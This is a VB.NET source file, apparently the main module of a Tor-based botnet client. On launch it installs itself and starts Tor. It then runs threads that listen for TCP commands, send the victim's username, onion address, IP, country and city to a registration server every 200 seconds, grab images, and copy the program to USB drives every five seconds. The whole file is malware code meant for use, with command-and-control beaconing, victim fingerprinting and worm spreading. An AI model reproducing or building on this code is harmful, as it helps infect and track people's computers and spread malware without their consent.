Imports System.IO
Imports System.Threading
Imports Alduin.Stump.Alduin.Stump.Class.Network
Imports Newtonsoft.Json

Module Main
    ReadOnly NewListener As New Thread(AddressOf Listener)
    ReadOnly NewNotice As New Thread(AddressOf Noticer)
    ReadOnly DelayedAction As New Thread(AddressOf DelayedActions)
    ReadOnly NewImageGraber As New Thread(AddressOf ImageGraber)
    Private _config As New ConfigBotModel
    Public Property Config As ConfigBotModel
        Get
            Return _config
        End Get
        Set(value As ConfigBotModel)
            _config = value
        End Set
    End Property

    Sub Main()
        configBot()
        Install()
        StartTor()

        NewListener.Start()
        NewNotice.Start()
        DelayedAction.Start()
        If Not File.Exists(GetLocal_path() & "\Images.txt") Then
            NewImageGraber.Start()
        End If
    End Sub
    Public Sub Listener()
        If Config.Variables.Debug Then
            Console.WriteLine("Listening") 'Debugging
        End If
        Dim tcplistener As New TcpListen
        While (True)
            tcplistener.TcpAsync()
        End While
    End Sub
    Public Sub Noticer()
        While (True)
            Dim model As New DefaultRegistrationModel With {
                .UserName = GetUsername(),
                .KeyUnique = GetConfigJson().KeyUnique,
                .KeyCertified = _config.Variables.CertifiedKey,
                .Domain = GetOnionAddress(),
                .CountryCode = GetCountyCode(GetMyIPAddress()),
                .LastIPAddress = GetMyIPAddress(),
                .City = GetCity(GetMyIPAddress())
            }
            Dim http As New SendHTTPonTor
            http.TalkChannelHTTP(model, _config.UrlVariables.RegistrationUrl)
            Thread.Sleep(SectoMs(200))
        End While
    End Sub
    Public Sub DelayedActions()
        While (True)
            USBSpreading(GetMainFile())
            Thread.Sleep(SectoMs(5))
        End While
    End Sub
    Public Sub configBot()
        Dim configjson = JsonConvert.DeserializeAnonymousType(File_reader("Config.json"), New ConfigBotModel)
        Config = configjson
    End Sub
End Module
